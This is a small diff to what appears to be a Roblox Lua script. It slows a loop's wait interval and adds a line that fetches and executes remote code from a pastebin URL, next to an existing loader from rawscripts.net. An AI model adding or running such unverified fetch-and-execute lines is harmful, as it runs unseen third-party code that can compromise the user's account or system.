@@ -124,7 +124,8 @@ end
 
 while true do
     stuff()
-    task.wait(0.01)
+    task.wait(3)
 end
 
 loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Boostfps-26436"))()
+loadstring(game:HttpGet("https://pastebin.com/raw/zJztwUg1", true))()
